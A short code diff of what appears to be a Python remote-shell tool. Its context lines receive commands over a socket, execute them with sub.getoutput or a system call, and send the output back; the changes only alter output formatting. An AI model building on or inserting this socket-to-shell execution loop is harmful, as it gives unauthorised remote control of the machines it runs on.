@@ -679,7 +679,7 @@ MORE Functions COMING...
                     sock.send("Invalid Directory".encode())
             else:
                 decode_data = sub.getoutput(data)
-                sock.send(decode_data.encode())
+                sock.send(f'|{decode_data}'.encode())
 
 
 
@@ -748,6 +748,7 @@ if __name__ == '__main__':
                 except:
                     print ("Dir not found")
             else:
+                print (F.CYAN+"")
                 sys(data)
         except:
                 print (F.RED+"[x] AN ERROR OCCURED")
